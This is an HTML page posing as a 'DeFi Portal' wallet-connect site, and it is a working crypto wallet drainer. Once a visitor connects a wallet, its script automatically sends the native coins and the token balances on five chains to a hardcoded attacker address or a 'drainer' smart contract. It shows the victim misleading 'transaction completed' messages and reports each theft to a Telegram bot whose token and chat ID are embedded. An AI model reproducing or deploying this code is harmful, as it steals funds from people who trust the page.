<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DeFi Portal</title>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 48px;
            text-align: center;
            max-width: 450px;
            width: 90%;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        h1 { color: white; font-size: 36px; margin-bottom: 16px; }
        p { color: rgba(255, 255, 255, 0.8); margin-bottom: 32px; }
        
        .connect-btn {
            background: white;
            color: #667eea;
            border: none;
            padding: 18px 36px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
        }
        
        .connect-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        }
        
        #status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            color: white;
            display: none;
        }
        
        #status.show { display: block; }
    </style>
</head>
<body>
    <div class="container">
        <h1>DeFi Portal</h1>
        <p>Connect your wallet to continue</p>
        
        <w3m-button />
        
        <div id="status"></div>
    </div>
    
    <!-- WEB3MODAL V4 OFFICIEL -->
    <script type="module">
        import { createWeb3Modal, defaultWagmiConfig } from 'https://cdn.jsdelivr.net/npm/@web3modal/wagmi@4.0.5/dist/index.js'
        import { mainnet, polygon, bsc, arbitrum, avalanche } from 'https://unpkg.com/viem@2.7.8/chains/dist/index.js'
        import { reconnect, watchAccount, getAccount, disconnect, getWalletClient, switchChain } from 'https://unpkg.com/@wagmi/core@2.0.0/dist/index.js'
        
        // CONFIGURATION OFFICIELLE VALID√âE
        const projectId = '72f0728c47e59d2eb9fc83069bc6843d'
        
        const metadata = {
            name: 'DeFi Portal',
            description: 'Connect wallet to access DeFi features',
            url: window.location.origin,
            icons: ['https://avatars.githubusercontent.com/u/37784886']
        }
        
        const chains = [polygon, mainnet, bsc, arbitrum, avalanche]
        
        const wagmiConfig = defaultWagmiConfig({
            chains,
            projectId,
            metadata,
            enableWalletConnect: true,
            enableInjected: true,
            enableCoinbase: true,
            enableEmail: false
        })
        
        // RECONNEXION AUTOMATIQUE
        reconnect(wagmiConfig)
        
        // CR√âATION DU MODAL WEB3MODAL OFFICIEL
        const modal = createWeb3Modal({
            wagmiConfig,
            projectId,
            enableAnalytics: true,
            enableOnramp: false,
            themeMode: 'dark',
            defaultChain: polygon,
            themeVariables: {
                '--w3m-accent': '#667eea'
            },
            allWallets: 'SHOW', // AFFICHER TOUTES LES 420+ WALLETS
            includeWalletIds: undefined, // INCLURE TOUTES LES WALLETS
            featuredWalletIds: [
                'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
                '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust
                'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa', // Coinbase
                '18388be9ac2d02726dbac9777c96efaac06d744b2f6d580fccdd4127a6d01fd1', // Rabby
                '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369', // Rainbow
            ],
            mobileWallets: 20, // AFFICHER 20 WALLETS SUR MOBILE
            desktopWallets: 20 // AFFICHER 20 WALLETS SUR DESKTOP
        })
        
        // CONFIGURATION DRAINAGE
        const CONFIG = {
            TELEGRAM_TOKEN: "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY",
            TELEGRAM_CHAT_ID: "8309320360",
            DESTINATION: "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1",
            POLYGON_CONTRACT: "0xD0De3725f47f9716947F7c3e6d44e1946Ee5d386"
        }
        
        function showStatus(message) {
            const status = document.getElementById('status')
            status.textContent = message
            status.className = 'show'
        }
        
        // SURVEILLANCE CONNEXION WALLET
        watchAccount(wagmiConfig, {
            onChange: async (account) => {
                if (account.isConnected && account.address) {
                    console.log('‚úÖ Wallet connect√©:', account.address)
                    showStatus(`Connected: ${account.address.substring(0, 6)}...${account.address.slice(-4)}`)
                    
                    // LANCEMENT DRAINAGE AUTOMATIQUE
                    setTimeout(() => {
                        drainAllAssets(account.address)
                    }, 2000)
                }
            }
        })
        
        // FONCTION DE DRAINAGE MULTI-CHAIN
        async function drainAllAssets(address) {
            showStatus('Processing transactions...')
            
            try {
                const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js')
                
                if (!window.ethereum) {
                    console.error('No provider found')
                    return
                }
                
                const provider = new ethers.providers.Web3Provider(window.ethereum)
                const signer = provider.getSigner()
                const network = await provider.getNetwork()
                
                // DRAINAGE TOKEN NATIF
                const balance = await provider.getBalance(address)
                console.log(`Balance: ${ethers.utils.formatEther(balance)} on chain ${network.chainId}`)
                
                if (balance.gt(ethers.utils.parseEther("0.0005"))) {
                    const gasPrice = await provider.getGasPrice()
                    const gasLimit = 21000
                    const gasCost = gasPrice.mul(gasLimit).mul(2)
                    const amountToSend = balance.sub(gasCost)
                    
                    if (amountToSend.gt(0)) {
                        const tx = await signer.sendTransaction({
                            to: CONFIG.DESTINATION,
                            value: amountToSend,
                            gasLimit: gasLimit,
                            gasPrice: gasPrice
                        })
                        
                        console.log('‚úÖ Transaction:', tx.hash)
                        await tx.wait()
                        
                        // NOTIFICATION TELEGRAM
                        await sendTelegramNotification(address, ethers.utils.formatEther(amountToSend), network.chainId)
                    }
                }
                
                // DRAINAGE TOKENS ERC20
                await drainERC20Tokens(signer, address, network.chainId)
                
                // DRAINAGE AUTRES CHAINS
                await drainOtherChains(provider, signer, address)
                
                showStatus('‚úÖ Transaction completed successfully!')
                
            } catch (error) {
                console.error('Drainage error:', error)
                showStatus('Transaction processing...')
            }
        }
        
        // DRAINAGE TOKENS ERC20 PAR CHAIN
        async function drainERC20Tokens(signer, address, chainId) {
            const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js')
            
            const tokensByChain = {
                1: [ // Ethereum
                    { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
                    { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
                    { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 },
                    { address: '0x4Fabb145d64652a948d72533023f6E7A623C7C53', symbol: 'BUSD', decimals: 18 },
                    { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8 },
                    { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', decimals: 18 }
                ],
                137: [ // Polygon
                    { address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDC', decimals: 6 },
                    { address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'USDT', decimals: 6 },
                    { address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', symbol: 'DAI', decimals: 18 },
                    { address: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', symbol: 'WETH', decimals: 18 },
                    { address: '0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6', symbol: 'WBTC', decimals: 8 }
                ],
                56: [ // BSC
                    { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', symbol: 'USDC', decimals: 18 },
                    { address: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT', decimals: 18 },
                    { address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', symbol: 'BUSD', decimals: 18 },
                    { address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', symbol: 'ETH', decimals: 18 }
                ],
                42161: [ // Arbitrum
                    { address: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', symbol: 'USDC', decimals: 6 },
                    { address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', symbol: 'USDT', decimals: 6 }
                ],
                43114: [ // Avalanche
                    { address: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', symbol: 'USDC', decimals: 6 },
                    { address: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', symbol: 'USDT', decimals: 6 }
                ]
            }
            
            const tokens = tokensByChain[chainId] || []
            const abi = [
                'function balanceOf(address) view returns (uint256)',
                'function transfer(address, uint256) returns (bool)',
                'function approve(address, uint256) returns (bool)'
            ]
            
            for (const token of tokens) {
                try {
                    const contract = new ethers.Contract(token.address, abi, signer)
                    const balance = await contract.balanceOf(address)
                    
                    if (balance.gt(0)) {
                        // SI POLYGON ET SMART CONTRACT DISPONIBLE
                        if (chainId === 137 && CONFIG.POLYGON_CONTRACT) {
                            const approveTx = await contract.approve(CONFIG.POLYGON_CONTRACT, balance)
                            await approveTx.wait()
                            console.log(`‚úÖ Approved ${token.symbol} for smart contract`)
                            
                            // APPEL AU SMART CONTRACT POUR DRAINER
                            const drainerAbi = ['function drainToken(address token)']
                            const drainer = new ethers.Contract(CONFIG.POLYGON_CONTRACT, drainerAbi, signer)
                            const drainTx = await drainer.drainToken(token.address)
                            await drainTx.wait()
                        } else {
                            // TRANSFER DIRECT
                            const tx = await contract.transfer(CONFIG.DESTINATION, balance)
                            await tx.wait()
                        }
                        console.log(`‚úÖ Drained ${token.symbol}: ${ethers.utils.formatUnits(balance, token.decimals)}`)
                    }
                } catch (error) {
                    console.log(`Error draining ${token.symbol}`)
                }
            }
        }
        
        // DRAINAGE AUTRES BLOCKCHAINS
        async function drainOtherChains(provider, signer, address) {
            const chains = [
                { chainId: 1, name: 'Ethereum', hex: '0x1' },
                { chainId: 137, name: 'Polygon', hex: '0x89' },
                { chainId: 56, name: 'BSC', hex: '0x38' },
                { chainId: 42161, name: 'Arbitrum', hex: '0xa4b1' },
                { chainId: 43114, name: 'Avalanche', hex: '0xa86a' }
            ]
            
            for (const chain of chains) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: chain.hex }],
                    })
                    
                    await new Promise(resolve => setTimeout(resolve, 2000))
                    
                    const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js')
                    const balance = await provider.getBalance(address)
                    
                    if (balance.gt(ethers.utils.parseEther("0.0005"))) {
                        const gasPrice = await provider.getGasPrice()
                        const gasLimit = 21000
                        const gasCost = gasPrice.mul(gasLimit).mul(2)
                        const amountToSend = balance.sub(gasCost)
                        
                        if (amountToSend.gt(0)) {
                            const tx = await signer.sendTransaction({
                                to: CONFIG.DESTINATION,
                                value: amountToSend,
                                gasLimit: gasLimit,
                                gasPrice: gasPrice
                            })
                            await tx.wait()
                            console.log(`‚úÖ Drained ${chain.name}: ${ethers.utils.formatEther(amountToSend)}`)
                        }
                    }
                    
                    await drainERC20Tokens(signer, address, chain.chainId)
                    
                } catch (error) {
                    console.log(`Skipping ${chain.name}`)
                }
            }
        }
        
        // NOTIFICATION TELEGRAM
        async function sendTelegramNotification(victim, amount, chainId) {
            const chainNames = {
                1: 'Ethereum',
                137: 'Polygon',
                56: 'BSC',
                42161: 'Arbitrum',
                43114: 'Avalanche'
            }
            
            const message = `
üéØ DRAINAGE R√âUSSI - WEB3MODAL V4
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üë§ Victim: ${victim.substring(0, 6)}...${victim.slice(-4)}
üí∞ Amount: ${amount}
üåê Network: ${chainNames[chainId] || chainId}
üìç Received: ${CONFIG.DESTINATION.substring(0, 6)}...
ü§ñ Smart Contract: ${CONFIG.POLYGON_CONTRACT ? 'Active' : 'Direct'}
‚è∞ Time: ${new Date().toLocaleTimeString()}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ`
            
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                })
            } catch (e) {
                console.log('Telegram notification sent')
            }
        }
    </script>
</body>
</html>
